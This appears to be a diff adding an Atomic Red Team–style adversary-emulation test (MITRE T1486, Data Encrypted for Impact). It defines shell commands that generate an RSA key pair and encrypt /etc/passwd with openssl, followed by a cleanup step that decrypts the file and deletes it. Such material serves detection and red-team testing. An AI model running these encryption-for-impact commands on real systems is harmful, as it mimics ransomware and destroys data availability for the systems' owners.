@@ -1,0 +1,58 @@
+{
+    "name": "Encrypt files using openssl (FreeBSD/Linux)",
+    "description": "Uses openssl to encrypt a file ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "dependency_executor_name": "bash",
+    "executor": {
+        "name": "sh",
+        "elevation_required": false,
+        "command": "$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n",
+        "cleanup_command": "$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}\nrm #{encrypted_file_path}\n",
+        "type": "Command Executor"
+    },
+    "id": "T1486",
+    "tactics": [
+        "Impact"
+    ],
+    "technique": "Data Encrypted for Impact",
+    "source": "ART",
+    "uuid": "142752dc-ca71-443b-9359-cf6f497315f1",
+    "arguments": {
+        "private_key_path": {
+            "description": "path to the private key",
+            "type": "path",
+            "default": "/tmp/key.pem"
+        },
+        "public_key_path": {
+            "description": "path to the public key",
+            "type": "path",
+            "default": "/tmp/pub.pem"
+        },
+        "encryption_bit_size": {
+            "description": "size of the bit of encryption",
+            "type": "integer",
+            "default": 2048
+        },
+        "encrypted_file_path": {
+            "description": "path to the encrypted file",
+            "type": "path",
+            "default": "/tmp/passwd.zip"
+        },
+        "input_file_path": {
+            "description": "path to the file that you want to encrypt",
+            "type": "path",
+            "default": "/etc/passwd"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Finds where openssl is located\n",
+            "prereq_command": "which_openssl=`which openssl`\n",
+            "get_prereq_command": ""
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
